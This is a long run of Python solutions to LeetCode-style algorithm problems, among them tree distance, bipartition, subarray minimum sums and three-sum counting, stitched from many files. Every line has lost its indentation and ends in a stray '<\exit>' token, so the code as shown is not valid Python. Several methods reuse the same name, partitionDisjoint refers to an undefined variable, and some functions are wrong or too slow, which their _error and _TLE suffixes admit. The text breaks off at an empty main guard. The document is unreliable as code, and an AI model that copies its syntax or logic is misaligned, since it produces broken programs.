def matrixScore(self, A: List[List[int]]) -> int:<\exit>
m, n = len(A), len(A[0])<\exit>
ret = 0<\exit>
ret += (1 << (n-1)) * m<\exit>
for j in range(1, n):<\exit>
cnt = 0<\exit>
for i in range(m):<\exit>
if A[i][j] == A[i][0]:<\exit>
cnt += 1<\exit>
cnt = max(cnt, m-cnt)<\exit>
ret += (1 << (n-1-j)) * cnt<\exit>
return ret<\exit>
class TreeNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
class Solution:<\exit>
def distanceK(self, root: TreeNode, target: TreeNode, K: int) -> List[int]:<\exit>
ret = []<\exit>
self.ancestor_dist(root, K, target, ret)<\exit>
return ret<\exit>
def dfs_down(self, node, d, ret):<\exit>
if not node:<\exit>
return<\exit>
if d == 0:<\exit>
ret.append(node.val)<\exit>
else:<\exit>
self.dfs_down(node.left, d - 1, ret)<\exit>
self.dfs_down(node.right, d - 1, ret)<\exit>
def ancestor_dist(self, node, K, target, ret):<\exit>
if not node:<\exit>
return float('inf')<\exit>
if node.val == target.val:<\exit>
self.dfs_down(node, K, ret)<\exit>
return 0<\exit>
else:<\exit>
l = self.ancestor_dist(node.left, K, target, ret)<\exit>
r = self.ancestor_dist(node.right, K, target, ret)<\exit>
d = min(l, r) + 1<\exit>
if d == K:<\exit>
ret.append(node.val)<\exit>
elif l == float('inf'):<\exit>
self.dfs_down(node.left, K - d - 1, ret)<\exit>
else:<\exit>
self.dfs_down(node.right, K - d - 1, ret)<\exit>
return d<\exit>
class SolutionComplicated:<\exit>
def distanceK(self, root: TreeNode, target: TreeNode, K: int) -> List[int]:<\exit>
ret = []<\exit>
self.dfs1(target, K, ret)<\exit>
hm = {}<\exit>
self.ancestor_dist(root, target, hm)<\exit>
self.dfs2(root, target, K, float("inf"), hm, ret)<\exit>
return ret<\exit>
def dfs1(self, node, K, ret):<\exit>
if not node:<\exit>
return<\exit>
if K == 0:<\exit>
ret.append(node.val)<\exit>
else:<\exit>
self.dfs1(node.left, K-1, ret)<\exit>
self.dfs1(node.right, K-1, ret)<\exit>
def ancestor_dist(self, node, target, hm):<\exit>
if not node:<\exit>
return float('inf')<\exit>
if node.val == target.val:<\exit>
hm[node.val] = 0<\exit>
else:<\exit>
left = self.ancestor_dist(node.left, target, hm)<\exit>
right = self.ancestor_dist(node.right, target, hm)<\exit>
hm[node.val] = min(left, right) + 1<\exit>
return hm[node.val]<\exit>
def dfs2(self, node, target, K, dist, hm, ret):<\exit>
if not node:<\exit>
return<\exit>
if node.val == target.val:<\exit>
return<\exit>
dist = min(dist, hm[node.val])<\exit>
if dist == K:<\exit>
ret.append(node.val)<\exit>
self.dfs2(node.left, target, K, dist + 1, hm, ret)<\exit>
self.dfs2(node.right, target, K, dist + 1, hm, ret)<\exit>
class TreeNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
class Solution:<\exit>
def __init__(self):<\exit>
self.deepest = -1<\exit>
self.deepest_nodes = None<\exit>
self.ret = None<\exit>
def subtreeWithAllDeepest(self, root: TreeNode) -> TreeNode:<\exit>
self.down(root, 0)<\exit>
if len(self.deepest_nodes) == 1:<\exit>
return self.deepest_nodes.pop()<\exit>
self.count(root)<\exit>
return self.ret<\exit>
def down(self, node: TreeNode, d: int) -> None:<\exit>
if not node:<\exit>
return<\exit>
if d > self.deepest:<\exit>
self.deepest = d<\exit>
self.deepest_nodes = set([node])<\exit>
elif d == self.deepest:<\exit>
self.deepest_nodes.add(node)<\exit>
self.down(node.left, d + 1)<\exit>
self.down(node.right, d + 1)<\exit>
def count(self, node: TreeNode) -> int:<\exit>
if not node:<\exit>
return 0<\exit>
l = self.count(node.left)<\exit>
r = self.count(node.right)<\exit>
if l != 0 and r != 0 and l + r == len(self.deepest_nodes):<\exit>
self.ret = node<\exit>
count = l + r<\exit>
if node in self.deepest_nodes:<\exit>
count += 1<\exit>
return count<\exit>
from collections import Counter<\exit>
class Solution:<\exit>
def reorderedPowerOf2(self, N: int) -> bool:<\exit>
counts = Counter(str(N))<\exit>
for i in range(31):<\exit>
if counts == Counter(str(1 << i)):<\exit>
return True<\exit>
else:<\exit>
return False<\exit>
from typing import List<\exit>
from collections import defaultdict<\exit>
class Solution:<\exit>
def advantageCount(self, A: List[int], B: List[int]) -> List[int]:<\exit>
idxes = defaultdict(list)<\exit>
for i, b in enumerate(B):<\exit>
idxes[b].append(i)<\exit>
n = len(A)<\exit>
A.sort()<\exit>
B.sort()<\exit>
ret = [None for _ in range(n)]<\exit>
not_used = []<\exit>
j = 0<\exit>
for a in A:<\exit>
if a > B[j]:<\exit>
i = idxes[B[j]].pop()<\exit>
ret[i] = a<\exit>
j += 1<\exit>
else:<\exit>
not_used.append(a)<\exit>
for i in range(n):<\exit>
if ret[i] is None:<\exit>
ret[i] = not_used.pop()<\exit>
return ret<\exit>
if __name__ == "__main__":<\exit>
assert Solution().advantageCount([2,7,11,15], [1,10,4,11]) == [2,11,7,15]<\exit>
class TreeNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
class Solution:<\exit>
def leafSimilar(self, root1: TreeNode, root2: TreeNode) -> bool:<\exit>
itr1 = self.dfs(root1)<\exit>
itr2 = self.dfs(root2)<\exit>
while True:<\exit>
a = next(itr1, None)<\exit>
b = next(itr2, None)<\exit>
if a != b:<\exit>
return False<\exit>
if a is None and b is None:<\exit>
break<\exit>
return True<\exit>
def dfs(self, node):<\exit>
stk = [node]<\exit>
while stk:<\exit>
cur = stk.pop()<\exit>
if not cur:<\exit>
continue<\exit>
if not cur.left and not cur.right:<\exit>
yield cur.val<\exit>
else:<\exit>
stk.append(cur.right)<\exit>
stk.append(cur.left)<\exit>
from typing import List<\exit>
class Solution:<\exit>
def lenLongestFibSubseq(self, A: List[int]) -> int:<\exit>
n = len(A)<\exit>
F = [[0 for _ in range(n)] for _ in range(n)]<\exit>
for i in range(n):<\exit>
F[i][i] = 1<\exit>
for j in range(i):<\exit>
F[i][j] = 2<\exit>
idxes = {}<\exit>
for i in range(n):<\exit>
idxes[A[i]] = i<\exit>
for i in range(n):<\exit>
for j in range(i):<\exit>
Ak = A[i] + A[j]<\exit>
if Ak in idxes:<\exit>
k = idxes[Ak]<\exit>
F[k][i] = max(F[k][i], F[i][j] + 1)<\exit>
return max(<\exit>
F[i][j] if F[i][j] > 2 else 0<\exit>
for i in range(n)<\exit>
for j in range(i)<\exit>
)<\exit>
def lenLongestFibSubseq_TLE(self, A: List[int]) -> int:<\exit>
n = len(A)<\exit>
F = [[0 for _ in range(n)] for _ in range(n)]<\exit>
for i in range(n):<\exit>
F[i][i] = 1<\exit>
for j in range(i):<\exit>
F[i][j] = 2<\exit>
for k in range(n):<\exit>
for i in range(k):<\exit>
for j in range(i):<\exit>
if A[i] + A[j] == A[k]:<\exit>
F[k][i] = max(F[k][i], F[i][j] + 1)<\exit>
return max(<\exit>
F[i][j] if F[i][j] > 2 else 0<\exit>
for i in range(n)<\exit>
for j in range(i)<\exit>
)<\exit>
if __name__ == "__main__":<\exit>
assert Solution().lenLongestFibSubseq([1,2,3,4,5,6,7,8]) == 5<\exit>
from typing import List<\exit>
import math<\exit>
class Solution:<\exit>
def minEatingSpeed(self, piles: List[int], H: int) -> int:<\exit>
if len(piles) > H:<\exit>
return None<\exit>
n = len(piles)<\exit>
hi = max(piles) + 1<\exit>
lo = 1<\exit>
while lo < hi:<\exit>
mid = (lo + hi) // 2<\exit>
if sum(<\exit>
math.ceil(piles[i] / mid)<\exit>
for i in range(n)<\exit>
) > H:<\exit>
lo = mid + 1<\exit>
else:<\exit>
hi = mid<\exit>
return lo<\exit>
if __name__ == "__main__":<\exit>
assert Solution().minEatingSpeed([3,6,7,11], 8) == 4<\exit>
class ListNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.next = None<\exit>
class Solution:<\exit>
def middleNode(self, head: ListNode) -> ListNode:<\exit>
l = 0<\exit>
cur = head<\exit>
while cur:<\exit>
l += 1<\exit>
cur = cur.next<\exit>
mid = l // 2 + 1<\exit>
cur_l = 0<\exit>
cur = head<\exit>
while cur:<\exit>
cur_l += 1<\exit>
if cur_l == mid:<\exit>
return cur<\exit>
cur = cur.next<\exit>
return None<\exit>
class Solution:<\exit>
def decodeAtIndex(self, S: str, K: int) -> str:<\exit>
l = 0<\exit>
for s in S:<\exit>
if s.isdigit():<\exit>
l *= int(s)<\exit>
else:<\exit>
l += 1<\exit>
for s in reversed(S):<\exit>
K %= l<\exit>
if K == 0 and s.isalpha():<\exit>
return s<\exit>
if s.isdigit():<\exit>
l //= int(s)<\exit>
else:<\exit>
l -= 1<\exit>
raise<\exit>
def decodeAtIndex_error(self, S: str, K: int) -> str:<\exit>
K -= 1<\exit>
i = 0<\exit>
j = 0<\exit>
last = None<\exit>
n = len(S)<\exit>
while j < n:<\exit>
if S[j].isdigit():<\exit>
if not last:<\exit>
last = j<\exit>
d = int(S[j])<\exit>
l = last - i<\exit>
while K >= l and d > 0:<\exit>
K -= l<\exit>
d -= 1<\exit>
if d > 0:<\exit>
return S[i + K]<\exit>
elif last:<\exit>
i = j<\exit>
last = None<\exit>
j += 1<\exit>
return S[i+K]<\exit>
if __name__ == "__main__":<\exit>
assert Solution().decodeAtIndex("ha22", 5) == "h"<\exit>
from typing import List<\exit>
from collections import deque<\exit>
class Solution:<\exit>
def numRescueBoats(self, people: List[int], limit: int) -> int:<\exit>
ret = 0<\exit>
q = deque(sorted(people))<\exit>
while q:<\exit>
tail = q.pop()<\exit>
ret += 1<\exit>
if q and q[0] + tail <= limit:<\exit>
q.popleft()<\exit>
return ret<\exit>
from typing import List<\exit>
from collections import Counter<\exit>
class Solution:<\exit>
def uncommonFromSentences(self, A: str, B: str) -> List[str]:<\exit>
c = Counter(A.split()) + Counter(B.split())<\exit>
ret = [<\exit>
k<\exit>
for k, v in c.items()<\exit>
if v == 1<\exit>
]<\exit>
return ret<\exit>
def uncommonFromSentences_complext(self, A: str, B: str) -> List[str]:<\exit>
c_A, c_B = Counter(A.split()), Counter(B.split())<\exit>
ret = []<\exit>
for k, v in c_A.items():<\exit>
if v == 1 and k not in c_B:<\exit>
ret.append(k)<\exit>
for k, v in c_B.items():<\exit>
if v == 1 and k not in c_A:<\exit>
ret.append(k)<\exit>
return ret<\exit>
def uncommonFromSentences_error(self, A: str, B: str) -> List[str]:<\exit>
s_A, s_B = set(A.split()), set(B.split())<\exit>
return list(<\exit>
(s_A - s_B) | (s_B - s_A)<\exit>
)<\exit>
from typing import List<\exit>
from collections import defaultdict<\exit>
class Solution:<\exit>
def possibleBipartition(self, N: int, dislikes: List[List[int]]) -> bool:<\exit>
G = defaultdict(list)<\exit>
for u, v in dislikes:<\exit>
G[u].append(v)<\exit>
G[v].append(u)<\exit>
visited = {}<\exit>
for u in range(1, N+1):<\exit>
if u not in visited:<\exit>
if not self.dfs(u, G, visited, 0):<\exit>
return False<\exit>
return True<\exit>
def dfs(self, u, G, visited, color):<\exit>
visited[u] = color<\exit>
for nbr in G[u]:<\exit>
if nbr in visited:<\exit>
if visited[nbr] == color:<\exit>
return False<\exit>
else:<\exit>
if not self.dfs(nbr, G, visited, color ^ 1):<\exit>
return False<\exit>
return True<\exit>
from typing import List<\exit>
import bisect<\exit>
class Solution:<\exit>
def fairCandySwap(self, A: List[int], B: List[int]) -> List[int]:<\exit>
sum_A = sum(A)<\exit>
sum_B = sum(B)<\exit>
diff = (sum_B - sum_A) // 2<\exit>
set_B = set(B)<\exit>
for a in A:<\exit>
if a + diff in set_B:<\exit>
return [a, a + diff]<\exit>
raise<\exit>
def fairCandySwap_complex(self, A: List[int], B: List[int]) -> List[int]:<\exit>
sum_A = sum(A)<\exit>
sum_B = sum(B)<\exit>
if sum_A > sum_B:<\exit>
return self.fairCandySwap(B, A)[::-1]<\exit>
A.sort()<\exit>
B.sort()<\exit>
diff = (sum_B - sum_A) // 2<\exit>
for a in A:<\exit>
i = bisect.bisect_left(B, a + diff)<\exit>
if i < len(B) and B[i] == a + diff:<\exit>
return [a, a + diff]<\exit>
raise<\exit>
from typing import List<\exit>
class TreeNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
class Solution:<\exit>
def constructFromPrePost(self, pre: List[int], post: List[int]) -> TreeNode:<\exit>
stk = []<\exit>
popped = None<\exit>
j = 0<\exit>
for e in pre:<\exit>
stk.append(TreeNode(e))<\exit>
while stk and stk[-1].val == post[j]:<\exit>
popped = stk.pop()<\exit>
j += 1<\exit>
if stk:<\exit>
if not stk[-1].left:<\exit>
stk[-1].left = popped<\exit>
else:<\exit>
stk[-1].right = popped<\exit>
assert j == len(post)<\exit>
return popped<\exit>
def constructFromPrePost_complex(self, pre: List[int], post: List[int]) -> TreeNode:<\exit>
if not pre or not post:<\exit>
return None<\exit>
root = TreeNode(pre[0])<\exit>
if len(pre) == 1:<\exit>
return root<\exit>
if pre[1] == post[-2]:<\exit>
left = None<\exit>
right = self.constructFromPrePost(pre[1:], post[:-1])<\exit>
else:<\exit>
l = 0<\exit>
for a in post:<\exit>
l += 1<\exit>
if a == pre[1]:<\exit>
break<\exit>
else:<\exit>
raise<\exit>
left = self.constructFromPrePost(pre[1:1+l], post[:l])<\exit>
right = self.constructFromPrePost(pre[1+l:], post[l:-1])<\exit>
root.left = left<\exit>
root.right = right<\exit>
return root<\exit>
from typing import List<\exit>
class Solution:<\exit>
def findAndReplacePattern(self, words: List[str], pattern: str) -> List[str]:<\exit>
ret = []<\exit>
for w in words:<\exit>
if self.match(w, pattern):<\exit>
ret.append(w)<\exit>
return ret<\exit>
def match(self, word, pattern):<\exit>
if len(word) != len(pattern):<\exit>
return False<\exit>
m = {}<\exit>
m_inv = {}<\exit>
for i in range(len(word)):<\exit>
if word[i] not in m and pattern[i] not in m_inv:<\exit>
m[word[i]] = pattern[i]<\exit>
m_inv[pattern[i]] = word[i]<\exit>
elif word[i] not in m or m[word[i]] != pattern[i]:<\exit>
return False<\exit>
else:<\exit>
return True<\exit>
class TreeNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
class Solution:<\exit>
def __init__(self):<\exit>
self.cache = {}<\exit>
def allPossibleFBT(self, N: int) -> List[TreeNode]:<\exit>
if N not in self.cache:<\exit>
if N == 0:<\exit>
ret = []<\exit>
elif N == 1:<\exit>
ret = [TreeNode(0)]<\exit>
else:<\exit>
ret = []<\exit>
for i in range(N):<\exit>
lefts = self.allPossibleFBT(i)<\exit>
rights = self.allPossibleFBT(N-1-i)<\exit>
if lefts and rights:<\exit>
for left in lefts:<\exit>
for right in rights:<\exit>
node = TreeNode(0)<\exit>
node.left = left<\exit>
node.right = right<\exit>
ret.append(node)<\exit>
self.cache[N] = ret<\exit>
return self.cache[N]<\exit>
from typing import List<\exit>
class Solution:<\exit>
def isMonotonic(self, A: List[int]) -> bool:<\exit>
mono = 0<\exit>
for i in range(1, len(A)):<\exit>
if mono == 0:<\exit>
if A[i] > A[i-1]:<\exit>
mono = 2<\exit>
elif A[i] < A[i-1]:<\exit>
mono = 1<\exit>
else:<\exit>
if A[i] > A[i-1] and mono == 1:<\exit>
return False<\exit>
elif A[i] < A[i-1] and mono == 2:<\exit>
return False<\exit>
else:<\exit>
return True<\exit>
class TreeNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
class Solution:<\exit>
def __init__(self):<\exit>
self.prev = None<\exit>
self.root = None<\exit>
def increasingBST(self, root: TreeNode) -> TreeNode:<\exit>
self.dfs(root)<\exit>
return self.root<\exit>
def dfs(self, node):<\exit>
if not node:<\exit>
return<\exit>
self.dfs(node.left)<\exit>
if not self.prev:<\exit>
self.root = node<\exit>
else:<\exit>
self.prev.right = node<\exit>
node.left = None<\exit>
self.prev = node<\exit>
self.dfs(node.right)<\exit>
class Solution:<\exit>
def subarrayBitwiseORs(self, A: List[int]) -> int:<\exit>
ret = set()<\exit>
cur = set()<\exit>
for a in A:<\exit>
cur = {a | e for e in cur} | {a}<\exit>
ret |= cur<\exit>
return len(ret)<\exit>
from typing import List<\exit>
class RLEIterator:<\exit>
def __init__(self, A: List[int]):<\exit>
self.cur_i = 0<\exit>
self.cur_used = 0<\exit>
self.A = A<\exit>
def next(self, n: int) -> int:<\exit>
run = self.cur_used + n<\exit>
while self.cur_i < len(self.A) and run > self.A[self.cur_i]:<\exit>
run -= self.A[self.cur_i]<\exit>
self.cur_i += 2<\exit>
if self.cur_i >= len(self.A):<\exit>
return -1<\exit>
self.cur_used = run<\exit>
return self.A[self.cur_i + 1]<\exit>
class StockSpanner:<\exit>
def __init__(self):<\exit>
self.stk = []<\exit>
def next(self, price: int) -> int:<\exit>
cur_span = 1<\exit>
while self.stk and self.stk[-1][0] <= price:<\exit>
_, span = self.stk.pop()<\exit>
cur_span += span<\exit>
self.stk.append((price, cur_span))<\exit>
return cur_span<\exit>
from typing import List<\exit>
class Solution:<\exit>
def sortArrayByParity(self, A: List[int]) -> List[int]:<\exit>
closed = -1<\exit>
for i in range(len(A)):<\exit>
if A[i] % 2 == 0:<\exit>
closed += 1<\exit>
A[closed], A[i] = A[i], A[closed]<\exit>
return A<\exit>
from typing import List<\exit>
MOD = 10 ** 9 + 7<\exit>
class Solution:<\exit>
def sumSubarrayMins(self, A: List[int]) -> int:<\exit>
n = len(A)<\exit>
L = [-1 for _ in A]<\exit>
R = [n for _ in A]<\exit>
stk = []<\exit>
for i in range(n):<\exit>
while stk and A[stk[-1]] >= A[i]:<\exit>
stk.pop()<\exit>
if stk:<\exit>
L[i] = stk[-1]<\exit>
stk.append(i)<\exit>
stk = []<\exit>
for i in range(n-1, -1, -1):<\exit>
while stk and A[stk[-1]] > A[i]:<\exit>
stk.pop()<\exit>
if stk:<\exit>
R[i] = stk[-1]<\exit>
stk.append(i)<\exit>
ret = 0<\exit>
for i in range(n):<\exit>
ret += (<\exit>
A[i] * (i - L[i]) * (R[i] - i)<\exit>
)<\exit>
ret %= MOD<\exit>
return ret<\exit>
class Solution:<\exit>
def sumSubarrayMins(self, A: List[int]) -> int:<\exit>
stk = []<\exit>
A = [-float('inf')] + A + [-float('inf')]<\exit>
ret = 0<\exit>
for i, a in enumerate(A):<\exit>
while stk and A[stk[-1]] > a:<\exit>
h = stk.pop()<\exit>
ret += A[h] * (h - stk[-1]) * (i - h)<\exit>
ret %= MOD<\exit>
stk.append(i)<\exit>
return ret<\exit>
if __name__ == "__main__":<\exit>
assert Solution().sumSubarrayMins([71,55,82,55]) == 593<\exit>
assert Solution().sumSubarrayMins([3,1,2,4]) == 17<\exit>
from typing import List<\exit>
class Solution:<\exit>
def smallestRangeI(self, A: List[int], K: int) -> int:<\exit>
return max(0, max(A) - K - (min(A) + K))<\exit>
from typing import List<\exit>
class Solution:<\exit>
def smallestRangeII(self, A: List[int], K: int) -> int:<\exit>
A.sort()<\exit>
mn = min(A)<\exit>
mx = max(A)<\exit>
ret = mx - mn<\exit>
for i in range(len(A) - 1):<\exit>
cur_mx = max(mx - K, A[i] + K)<\exit>
cur_mn = min(mn + K, A[i+1] - K)<\exit>
ret = min(ret, cur_mx - cur_mn)<\exit>
return ret<\exit>
def smallestRangeII_error(self, A: List[int], K: int) -> int:<\exit>
mini = min(A)<\exit>
maxa = max(A)<\exit>
B = []<\exit>
max_upper_diff = 0<\exit>
max_lower_diff = 0<\exit>
upper = max(mini + K, maxa - K)<\exit>
lower = min(mini + K, maxa - K)<\exit>
for a in A:<\exit>
diffs = [(a + K) - upper, lower - (a - K)]<\exit>
cur_diff = min(diffs)<\exit>
if cur_diff == diffs[0] and cur_diff >= max_upper_diff:<\exit>
max_upper_diff = cur_diff<\exit>
elif cur_diff == diffs[1] and cur_diff >= max_lower_diff:<\exit>
max_lower_diff = cur_diff<\exit>
return upper + max_upper_diff - (lower + max_lower_diff)<\exit>
from typing import List<\exit>
from collections import defaultdict<\exit>
import bisect<\exit>
class TopVotedCandidate:<\exit>
def __init__(self, persons: List[int], times: List[int]):<\exit>
self.maxes = []<\exit>
counter = defaultdict(int)<\exit>
tp = sorted(zip(times, persons))<\exit>
for t, p in tp:<\exit>
counter[p] += 1<\exit>
if not self.maxes or counter[self.maxes[-1][1]] <= counter[p]:<\exit>
self.maxes.append((t, p))<\exit>
def q(self, t: int) -> int:<\exit>
i = bisect.bisect(self.maxes, (t, 0))<\exit>
if i < len(self.maxes) and self.maxes[i][0] == t:<\exit>
return self.maxes[i][1]<\exit>
i -= 1<\exit>
return self.maxes[i][1]<\exit>
from typing import List<\exit>
from collections import Counter<\exit>
class Solution:<\exit>
def hasGroupsSizeX(self, deck: List[int]) -> bool:<\exit>
counter = Counter(deck)<\exit>
gcd = None<\exit>
for v in counter.values():<\exit>
if gcd is None:<\exit>
gcd = v<\exit>
gcd = self.gcd(gcd, v)<\exit>
if gcd == 1:<\exit>
return False<\exit>
return True<\exit>
def gcd(self, a, b):<\exit>
while b:<\exit>
a, b = b, a % b<\exit>
return a<\exit>
from typing import List<\exit>
class Solution:<\exit>
def partitionDisjoint(self, A: List[int]) -> int:<\exit>
n = len(A)<\exit>
MX = [-float('inf') for _ in range(n+1)]<\exit>
MI = [float('inf') for _ in range(n+1)]<\exit>
for i in range(n):<\exit>
MX[i+1] = max(M[i], A[i])<\exit>
for i in range(n-1, -1, -1):<\exit>
MI[i] = min(MI[i+1], A[i])<\exit>
for l in range(1, n+1):<\exit>
if MX[l] <= MI[l]:<\exit>
return l<\exit>
raise<\exit>
def partitionDisjoint_2(self, A: List[int]) -> int:<\exit>
MX = [0 for _ in A]<\exit>
MI = [0 for _ in A]<\exit>
MX[0] = A[0]<\exit>
MI[-1] = A[-1]<\exit>
n = len(A)<\exit>
for i in range(1, n):<\exit>
MX[i] = max(MX[i-1], A[i])<\exit>
for i in range(n-2, -1, -1):<\exit>
MI[i] = min(MI[i+1], A[i])<\exit>
for i in range(n-1):<\exit>
if MX[i] <= MI[i+1]:<\exit>
return i<\exit>
raise<\exit>
from typing import List<\exit>
from collections import Counter, defaultdict<\exit>
class Solution:<\exit>
def wordSubsets(self, A: List[str], B: List[str]) -> List[str]:<\exit>
mx = defaultdict(int)<\exit>
for b in B:<\exit>
c = Counter(b)<\exit>
for k, v in c.items():<\exit>
mx[k] = max(mx[k], v)<\exit>
ret = []<\exit>
for a in A:<\exit>
c = Counter(a)<\exit>
for k, v in mx.items():<\exit>
if c[k] < v:<\exit>
break<\exit>
else:<\exit>
ret.append(a)<\exit>
return ret<\exit>
class Solution:<\exit>
def reverseOnlyLetters(self, S: str) -> str:<\exit>
lst = list(S)<\exit>
i = 0<\exit>
n = len(lst)<\exit>
j = n - 1<\exit>
while True:<\exit>
while i < n and not lst[i].isalpha():<\exit>
i += 1<\exit>
while j >= 0 and not lst[j].isalpha():<\exit>
j -= 1<\exit>
if i < j and i < n and j >= 0:<\exit>
lst[i], lst[j] = lst[j], lst[i]<\exit>
i += 1<\exit>
j -= 1<\exit>
else:<\exit>
break<\exit>
return "".join(lst)<\exit>
if __name__ == "__main__":<\exit>
assert Solution().reverseOnlyLetters("Test1ng-Leet=code-Q!") == "Qedo1ct-eeLg=ntse-T!"<\exit>
from typing import List<\exit>
class Solution:<\exit>
def maxSubarraySumCircular(self, A: List[int]) -> int:<\exit>
ret1 = self.max_subarray(A)<\exit>
ret2 = sum(A) + self.max_subarray([-a for a in A[1:-1]])<\exit>
return max(ret1, ret2)<\exit>
def max_subarray(self, A) -> int:<\exit>
mx = -float('inf')<\exit>
cur = 0<\exit>
for a in A:<\exit>
cur = a + max(cur, 0)<\exit>
mx = max(mx, cur)<\exit>
return mx<\exit>
def maxSubarraySumCircular_error(self, A: List[int]) -> int:<\exit>
cur = [0, None]<\exit>
mx = -float('inf')<\exit>
i = 0<\exit>
j = 0<\exit>
n = len(A)<\exit>
while i < n:<\exit>
cur[0] += A[i]<\exit>
cur[1] = i<\exit>
mx = max(mx, cur[0])<\exit>
j = i + 1<\exit>
while cur[0] >= 0 and j < i + n:<\exit>
cur[0] += A[j % n]<\exit>
mx = max(mx, cur[0])<\exit>
j += 1<\exit>
i = j<\exit>
return mx<\exit>
class TreeNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
from collections import deque<\exit>
class CBTInserter:<\exit>
def __init__(self, root: TreeNode):<\exit>
self.candidates = deque()<\exit>
self.root = root<\exit>
q = [root]<\exit>
while q:<\exit>
cur_q = []<\exit>
for e in q:<\exit>
if e.left:<\exit>
cur_q.append(e.left)<\exit>
if e.right:<\exit>
cur_q.append(e.right)<\exit>
if not e.left or not e.right:<\exit>
self.candidates.append(e)<\exit>
q = cur_q<\exit>
def insert(self, v: int) -> int:<\exit>
pi = self.candidates[0]<\exit>
node = TreeNode(v)<\exit>
if not pi.left:<\exit>
pi.left = node<\exit>
else:<\exit>
pi.right = node<\exit>
if pi.left and pi.right:<\exit>
self.candidates.popleft()<\exit>
self.candidates.append(node)<\exit>
return pi.val<\exit>
def get_root(self) -> TreeNode:<\exit>
return self.root<\exit>
class Solution:<\exit>
def minAddToMakeValid(self, S: str) -> int:<\exit>
ret = 0<\exit>
stk = []<\exit>
for s in S:<\exit>
if s == "(":<\exit>
stk.append(s)<\exit>
else:<\exit>
if stk:<\exit>
stk.pop()<\exit>
else:<\exit>
ret += 1<\exit>
ret += len(stk)<\exit>
return ret<\exit>
from typing import List<\exit>
class Solution:<\exit>
def sortArrayByParityII(self, A: List[int]) -> List[int]:<\exit>
even_idx = 0<\exit>
for odd_idx in range(1, len(A), 2):<\exit>
if A[odd_idx] % 2 == 0:<\exit>
while A[even_idx] % 2 == 0:<\exit>
even_idx += 2<\exit>
A[odd_idx], A[even_idx] = A[even_idx], A[odd_idx]<\exit>
return A<\exit>
def sortArrayByParityII_complex(self, A: List[int]) -> List[int]:<\exit>
closed = -1<\exit>
n = len(A)<\exit>
for i in range(n):<\exit>
if A[i] % 2 == 0:<\exit>
closed += 1<\exit>
A[i], A[closed] = A[closed], A[i]<\exit>
j = closed + 1<\exit>
if j % 2 == 1:<\exit>
j += 1<\exit>
for i in range(1, closed + 1, 2):<\exit>
A[i], A[j] = A[j], A[i]<\exit>
j += 2<\exit>
return A<\exit>
if __name__ == "__main__":<\exit>
assert Solution().sortArrayByParityII([4,1,1,0,1,0]) == [4,1,0,1,0,1]<\exit>
from typing import List<\exit>
from collections import defaultdict<\exit>
MOD = 10 ** 9 + 7<\exit>
class Solution:<\exit>
def threeSumMulti(self, A: List[int], target: int) -> int:<\exit>
counter = defaultdict(int)<\exit>
for a in A:<\exit>
counter[a] += 1<\exit>
keys = list(counter.keys())<\exit>
keys.sort()<\exit>
n = len(keys)<\exit>
ret = 0<\exit>
for i in range(n):<\exit>
j = i<\exit>
k = n - 1<\exit>
while j <= k:<\exit>
a, b, c = keys[i], keys[j], keys[k]<\exit>
if b + c < target - a:<\exit>
j += 1<\exit>
elif b + c > target - a:<\exit>
k -= 1<\exit>
else:<\exit>
if a < b < c:<\exit>
ret += counter[a] * counter[b] * counter[c]<\exit>
elif a == b < c:<\exit>
ret += counter[a] * (counter[a] - 1) // 2 * counter[c]<\exit>
elif a < b == c:<\exit>
ret += counter[a] * counter[b]  * (counter[b] - 1) // 2<\exit>
elif a== b == c:<\exit>
ret += counter[a] * (counter[a] - 1) * (counter[a] - 2) // (3 * 2)<\exit>
else:<\exit>
raise<\exit>
ret %= MOD<\exit>
j += 1<\exit>
k -= 1<\exit>
return ret<\exit>
def threeSumMulti_TLE(self, A: List[int], target: int) -> int:<\exit>
A.sort()<\exit>
n = len(A)<\exit>
ret = 0<\exit>
for i in range(n):<\exit>
j = i + 1<\exit>
k = n - 1<\exit>
while j < k:<\exit>
if A[j] + A[k] < target - A[i]:<\exit>
j += 1<\exit>
elif A[j] + A[k] > target - A[i]:<\exit>
k -= 1<\exit>
else:<\exit>
l_cnt = 1<\exit>
while j + l_cnt < n and A[j + l_cnt] == A[j]:<\exit>
l_cnt += 1<\exit>
r_cnt = 1<\exit>
while k - r_cnt >= 0 and A[k - r_cnt] == A[k]:<\exit>
r_cnt += 1<\exit>
if A[j] != A[k]:<\exit>
ret += l_cnt * r_cnt<\exit>
ret %= MOD<\exit>
else:<\exit>
ret += l_cnt * (l_cnt - 1) // 2<\exit>
ret %= MOD<\exit>
j += l_cnt<\exit>
k -= r_cnt<\exit>
return ret<\exit>
def threeSumMulti_TLE(self, A: List[int], target: int) -> int:<\exit>
n = len(A)<\exit>
F = [[[0 for _ in range(3 + 1)] for _ in range(target + 1)] for _ in range(n+1)]<\exit>
for i in range(n+1):<\exit>
F[i][0][0] = 1<\exit>
for i in range(1, n + 1):<\exit>
for t in range(target + 1):<\exit>
for k in range(1, 3 + 1):<\exit>
F[i][t][k] = F[i-1][t][k] % MOD<\exit>
if t - A[i-1] >= 0:<\exit>
F[i][t][k] += F[i-1][t-A[i-1]][k-1] % MOD<\exit>
print(F[n][target][3])<\exit>
return F[n][target][3]<\exit>
def threeSumMulti_TLE(self, A: List[int], target: int) -> int:<\exit>
F = defaultdict(lambda: defaultdict(lambda: defaultdict(int)))<\exit>
n = len(A)<\exit>
for i in range(n+1):<\exit>
F[i][0][0] = 1<\exit>
for i in range(1, n + 1):<\exit>
for t in range(target + 1):<\exit>
for k in range(1, 3 + 1):<\exit>
F[i][t][k] = F[i-1][t][k] + F[i-1][t-A[i-1]][k-1]<\exit>
F[i][t][k] %= MOD<\exit>
return F[n][target][3]<\exit>
if __name__ == "__main__":<\exit>
